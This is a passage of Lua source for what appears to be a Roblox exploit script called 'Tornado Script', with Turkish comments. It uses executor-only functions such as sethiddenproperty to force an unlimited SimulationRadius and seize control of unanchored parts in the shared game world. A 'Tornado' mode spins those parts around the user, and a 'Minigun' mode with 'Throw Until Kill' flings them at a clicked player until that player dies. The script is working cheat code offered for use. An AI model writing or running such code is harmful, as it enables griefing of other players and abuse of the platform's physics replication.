MainFrame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInputMain = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInputMain and draggingMain then
        updateMain(input)
    end
end)

-- Arayüzü sürükleme (HeightGui)
local draggingHeight
local dragInputHeight
local dragStartHeight
local startPosHeight

local function updateHeight(input)
    local delta = input.Position - dragStartHeight
    HeightGui.Position = UDim2.new(startPosHeight.X.Scale, startPosHeight.X.Offset + delta.X, startPosHeight.Y.Scale, startPosHeight.Y.Offset + delta.Y)
end

HeightGui.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        draggingHeight = true
        dragStartHeight = input.Position
        startPosHeight = HeightGui.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                draggingHeight = false
            end
        end)
    end
end)

HeightGui.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInputHeight = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInputHeight and draggingHeight then
        updateHeight(input)
    end
end)

-- Arayüzü sürükleme (CreditsGui)
local draggingCredits
local dragInputCredits
local dragStartCredits
local startPosCredits

local function updateCredits(input)
    local delta = input.Position - dragStartCredits
    CreditsGui.Position = UDim2.new(startPosCredits.X.Scale, startPosCredits.X.Offset + delta.X, startPosCredits.Y.Scale, startPosCredits.Y.Offset + delta.Y)
end

CreditsGui.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        draggingCredits = true
        dragStartCredits = input.Position
        startPosCredits = CreditsGui.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                draggingCredits = false
            end
        end)
    end
end)

CreditsGui.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInputCredits = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInputCredits and draggingCredits then
        updateCredits(input)
    end
end)

-- Ring Parts Logic (Tornado Parts için kullanılacak)
local Folder = Instance.new("Folder", Workspace)
local Part = Instance.new("Part", Folder)
local Attachment1 = Instance.new("Attachment", Part)
Part.Anchored = true
Part.CanCollide = false
Part.Transparency = 1

if not getgenv().Network then
    getgenv().Network = {
        BaseParts = {},
        Velocity = Vector3.new(14.46262424, 14.46262424, 14.46262424)
    }

    Network.RetainPart = function(Part)
        if typeof(Part) == "Instance" and Part:IsA("BasePart") and Part:IsDescendantOf(Workspace) then
            table.insert(Network.BaseParts, Part)
            Part.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
            Part.CanCollide = false
        end
    end

    local function EnablePartControl()
        LocalPlayer.ReplicationFocus = Workspace
        RunService.Heartbeat:Connect(function()
            pcall(function()
                sethiddenproperty(LocalPlayer, "SimulationRadius", math.huge)
                for _, Part in pairs(Network.BaseParts) do
                    if Part:IsDescendantOf(Workspace) then
                        Part.Velocity = Network.Velocity
                    end
                end
            end)
        end)
    end

    EnablePartControl()
end

local function ForcePart(v)
    if v:IsA("Part") and not v.Anchored and not v.Parent:FindFirstChild("Humanoid") and not v.Parent:FindFirstChild("Head") and v.Name ~= "Handle" then
        for _, x in next, v:GetChildren() do
            if x:IsA("BodyAngularVelocity") or x:IsA("BodyForce") or x:IsA("BodyGyro") or x:IsA("BodyPosition") or x:IsA("BodyThrust") or x:IsA("BodyVelocity") or x:IsA("RocketPropulsion") then
                x:Destroy()
            end
        end
        if v:FindFirstChild("Attachment") then
            v:FindFirstChild("Attachment"):Destroy()
        end
        if v:FindFirstChild("AlignPosition") then
            v:FindFirstChild("AlignPosition"):Destroy()
        end
        if v:FindFirstChild("Torque") then
            v:FindFirstChild("Torque"):Destroy()
        end
        v.CanCollide = false
        local Torque = Instance.new("Torque", v)
        Torque.Torque = Vector3.new(100000, 100000, 100000)
        local AlignPosition = Instance.new("AlignPosition", v)
        local Attachment2 = Instance.new("Attachment", v)
        Torque.Attachment0 = Attachment2
        AlignPosition.MaxForce = 9999999999999999
        AlignPosition.MaxVelocity = math.huge
        AlignPosition.Responsiveness = 200
        AlignPosition.Attachment0 = Attachment2
        AlignPosition.Attachment1 = Attachment1
        return true
    end
    return false
end

local radius = 50
local rotationSpeed = 50
local tornadoHeightOffset = 50
local ringPartsEnabled = false
local angleOffset = 0
local parts = {}
local descendantConnection

local function addPart(part)
    if ringPartsEnabled and ForcePart(part) then
        if not table.find(parts, part) then
            table.insert(parts, part)
            Network.RetainPart(part)
        end
    end
end

local function removePart(part)
    local index = table.find(parts, part)
    if index then
        table.remove(parts, index)
        local indexInNetwork = table.find(Network.BaseParts, part)
        if indexInNetwork then
            table.remove(Network.BaseParts, indexInNetwork)
        end
    end
end

local function startPartCollection()
    for _, part in pairs(Workspace:GetDescendants()) do
        addPart(part)
    end
    descendantConnection = Workspace.DescendantAdded:Connect(addPart)
    Workspace.DescendantRemoving:Connect(removePart)
end

local function stopPartCollection()
    if descendantConnection then
        descendantConnection:Disconnect()
        descendantConnection = nil
    end
    for i = #parts, 1, -1 do
        local part = parts[i]
        removePart(part)
        if part then
            for _, x in next, part:GetChildren() do
                if x:IsA("Torque") or x:IsA("AlignPosition") or x:IsA("Attachment") then
                    x:Destroy()
                end
            end
        end
    end
end

RunService.Heartbeat:Connect(function(deltaTime)
    if not ringPartsEnabled then return end
    
    local humanoidRootPart = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if humanoidRootPart then
        local center = humanoidRootPart.Position + Vector3.new(0, tornadoHeightOffset, 0)
        angleOffset = angleOffset + (rotationSpeed * deltaTime)
        
        for i, part in pairs(parts) do
            if part.Parent and not part.Anchored then
                local angle = (angleOffset + (i * 2 * math.pi / math.max(1, #parts))) % (2 * math.pi)
                local targetX = center.X + math.cos(angle) * radius
                local targetZ = center.Z + math.sin(angle) * radius
                local targetY = center.Y + (tornadoHeightOffset * math.abs(math.sin((part.Position.Y - center.Y) / tornadoHeightOffset)))
                local targetPos = Vector3.new(targetX, targetY, targetZ)
                
                local bodyPosition = part:FindFirstChild("BodyPosition")
                if not bodyPosition then
                    bodyPosition = Instance.new("BodyPosition", part)
                    bodyPosition.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                    bodyPosition.D = 500
                    bodyPosition.P = 10000
                end
                bodyPosition.Position = targetPos
            end
        end
    end
end)

-- Minigun Logic
local minigunActive = false
local targetPlayer = nil
local isPulling = false
local pullConnections = {}
local renderConnection = nil
local throwUntilKillEnabled = true -- Varsayılan olarak açık
local unanchoredParts = {} -- Parçaları global olarak saklamak için

-- "Throw Until Kill" Butonunun İşlevi
ThrowUntilKillButton.MouseButton1Click:Connect(function()
    throwUntilKillEnabled = not throwUntilKillEnabled
    ThrowUntilKillButton.Text = "Throw Until Kill: " .. (throwUntilKillEnabled and "On" or "Off")
    ThrowUntilKillButton.BackgroundColor3 = throwUntilKillEnabled and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 0)
    playSound("12221967")
end)

local function collectUnanchoredParts()
    local parts = {}
    for _, part in pairs(Workspace:GetDescendants()) do
        if part:IsA("Part") and not part.Anchored and not part.Parent:FindFirstChild("Humanoid") and not part.Parent:FindFirstChild("Head") and part.Name ~= "Handle" then
            table.insert(parts, part)
        end
    end
    return parts
end

local function applyPullToParts(target)
    -- Önceki BodyPosition'ları temizle
    for _, connection in pairs(pullConnections) do
        if connection then
            connection:Destroy()
        end
    end
    pullConnections = {}

    -- Yeni parçaları topla ve BodyPosition ekle
    unanchoredParts = collectUnanchoredParts()
    for _, part in pairs(unanchoredParts) do
        if part and part.Parent then
            local bodyPosition = Instance.new("BodyPosition")
            bodyPosition.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            bodyPosition.D = 500
            bodyPosition.P = 10000
            bodyPosition.Parent = part
            table.insert(pullConnections, bodyPosition)
            part.CanCollide = true
        end
    end
end

local function updatePulling()
    local heartbeatConnection
    heartbeatConnection = RunService.Heartbeat:Connect(function()
        if not isPulling or not targetPlayer or not targetPlayer.Parent then
            heartbeatConnection:Disconnect()
            return
        end
        local humanoid = targetPlayer.Parent:FindFirstChild("Humanoid")
        if humanoid and humanoid.Health > 0 then
            -- Canlı takip: Hedef oyuncunun güncel pozisyonuna göre BodyPosition.Position'ı güncelle
            for _, bodyPosition in pairs(pullConnections) do
                if bodyPosition and bodyPosition.Parent then
                    bodyPosition.Position = targetPlayer.Position
                end
            end
            for _, part in pairs(unanchoredParts) do
                if part and part.Parent then
                    part.Velocity = (targetPlayer.Position - part.Position).Unit * 50
                    part.CanCollide = true
                end
            end
        else
            stopPulling()
            StopButton.Visible = false
            ExitButton.Visible = true
            heartbeatConnection:Disconnect()
            return
        end
    end)
end

local function stopPulling()
    for _, connection in pairs(pullConnections) do
        if connection then
            connection:Destroy()
        end
    end
    pullConnections = {}
    isPulling = false
    for _, part in pairs(unanchoredParts) do
        if part then
            part.CanCollide = false
        end
    end
    unanchoredParts = {}
end

local function startMinigunLoop()
    -- Sürekli güncelleme döngüsünü başlat
    updatePulling()

    -- Throw Until Kill açıkken döngü olmadan devam eder, kapalıyken 2 saniyede bir parçaları yeniler
    while isPulling and targetPlayer and targetPlayer.Parent do
        local humanoid = targetPlayer.Parent:FindFirstChild("Humanoid")
        if humanoid and humanoid.Health > 0 then
            if not throwUntilKillEnabled then
                -- Throw Until Kill kapalıysa, 2 saniyede bir parçaları yenile
                applyPullToParts(targetPlayer)
                wait(2)
            else
                -- Throw Until Kill açıksa, döngüye girmeden sürekli çekim
                wait(0.1)
            end
        else
            stopPulling()
            StopButton.Visible = false
            ExitButton.Visible = true
            break
        end
    end
end

MinigunOption.MouseButton1Click:Connect(function()
    minigunActive = not minigunActive
    MinigunOption.Text = minigunActive and "Minigun On" or "Minigun Off"
    MinigunOption.BackgroundColor3 = minigunActive and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 0)
    if not minigunActive then
        stopPulling()
        targetPlayer = nil
        SelectionFrame.Visible = false
        LaunchButton.Visible = false
        ThrowUntilKillButton.Visible = false
        StopButton.Visible = false
        ExitButton.Visible = false
        if renderConnection then
            renderConnection:Disconnect()
            renderConnection = nil
        end
    end
    playSound("12221967")
end)

local function updateSelectionFrame()
    if targetPlayer and targetPlayer.Parent and minigunActive then
        local camera = Workspace.CurrentCamera
        if camera then
            local vector, onScreen = camera:WorldToScreenPoint(targetPlayer.Position)
            if onScreen then
                SelectionFrame.Position = UDim2.new(0, vector.X - 50, 0, vector.Y - 50)
                SelectionFrame.Visible = true
            else
                SelectionFrame.Visible = false
            end
        end
    else
        SelectionFrame.Visible = false
    end
end

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        if not minigunActive then return end
        if LaunchButton.Visible or StopButton.Visible or ExitButton.Visible then return end
        local mouse = LocalPlayer:GetMouse()
        local target = mouse.Target
        if target then
            local humanoid = target.Parent:FindFirstChild("Humanoid")
            if humanoid and humanoid.Parent ~= LocalPlayer.Character then
                local newTargetPlayer = humanoid.Parent:FindFirstChild("HumanoidRootPart")
                if newTargetPlayer and newTargetPlayer ~= targetPlayer then
                    targetPlayer = newTargetPlayer
                    SelectionFrame.Visible = true
                    LaunchButton.Visible = true
                    ThrowUntilKillButton.Visible = true
                    updateSelectionFrame()
                    if renderConnection then
                        renderConnection:Disconnect()
                    end
                    renderConnection = RunService.RenderStepped:Connect(function()
                        if not targetPlayer or not minigunActive then
                            renderConnection:Disconnect()
                            renderConnection = nil
                            SelectionFrame.Visible = false
                            return
                        end
                        updateSelectionFrame()
                    end)
                end
            end
        end
    end
end)

LaunchButton.MouseButton1Click:Connect(function()
    if targetPlayer and targetPlayer.Parent then
        isPulling = true
        LaunchButton.Visible = false
        ThrowUntilKillButton.Visible = false
        StopButton.Visible = true
        applyPullToParts(targetPlayer)
        spawn(startMinigunLoop)
        playSound("12221967")
    end
end)

StopButton.MouseButton1Click:Connect(function()
    stopPulling()
    StopButton.Visible = false
    ExitButton.Visible = true
    playSound("12221967")
end)

ExitButton.MouseButton1Click:Connect(function()
    stopPulling()
    targetPlayer = nil
    SelectionFrame.Visible = false
    LaunchButton.Visible = false
    ThrowUntilKillButton.Visible = false
    StopButton.Visible = false
    ExitButton.Visible = false
    if renderConnection then
        renderConnection:Disconnect()
        renderConnection = nil
    end
    playSound("12221967")
end)

ToggleButton.MouseButton1Click:Connect(function()
    ringPartsEnabled = not ringPartsEnabled
    ToggleButton.Text = ringPartsEnabled and "Tornado Parts On" or "Tornado Parts Off"
    ToggleButton.BackgroundColor3 = ringPartsEnabled and Color3.fromRGB(50, 205, 50) or Color3.fromRGB(160, 82, 45)
    if ringPartsEnabled then
        startPartCollection()
    else
        stopPartCollection()
    end
    playSound("12221967")
end)

DecreaseRadius.MouseButton1Click:Connect(function()
    radius = math.max(1, radius - 2)
    RadiusDisplay.Text = "Radius: " .. radius
    playSound("12221967")
end)

IncreaseRadius.MouseButton1Click:Connect(function()
    radius = math.min(1000, radius + 2)
    RadiusDisplay.Text = "Radius: " .. radius
    playSound("12221967")
end)

UpButton.MouseButton1Click:Connect(function()
    tornadoHeightOffset = math.clamp(tornadoHeightOffset + 5, -100, 1000)
    HeightDisplay.Text = "Height: " .. tornadoHeightOffset
    playSound("12221967")
end)

DownButton.MouseButton1Click:Connect(function()
    tornadoHeightOffset = math.clamp(tornadoHeightOffset - 5, -100, 1000)
    HeightDisplay.Text = "Height: " .. tornadoHeightOffset
    playSound("12221967")
end)

SpeedInput.FocusLost:Connect(function(enterPressed)
    if enterPressed then
        local inputValue = tonumber(SpeedInput.Text)
        if inputValue then
            rotationSpeed = math.clamp(inputValue, 0, 100)
            SpeedInput.Text = tostring(rotationSpeed)
            playSound("12221967")
        else
            SpeedInput.Text = tostring(rotationSpeed)
        end
    end
end)

TornadoOption.MouseButton1Click:Connect(function()
    DropdownFrame.Visible = false
    dropdownVisible = false
    ArrowButton.Text = "↓"
    playSound("12221967")
end)

local success, userId = pcall(function()
    return Players:GetUserIdFromNameAsync("Arasbey232323")
end)
if success and userId then
    local thumbType = Enum.ThumbnailType.HeadShot
    local thumbSize = Enum.ThumbnailSize.Size620x720
    local content, isReady = Players:GetUserThumbnailAsync(userId, thumbType, thumbSize)
    if isReady then
        StarterGui:SetCore("SendNotification", {
            Title = "Tornado Script - Arassys",
            Text = ":)",
            Icon = content,
            Duration = 5
        })
    end
end

local function SendChatMessage(message)
    pcall(function()
        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
            local textChannel = TextChatService.TextChannels.RBXGeneral
            textChannel:SendAsync(message)
        else
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
        end
    end)
end
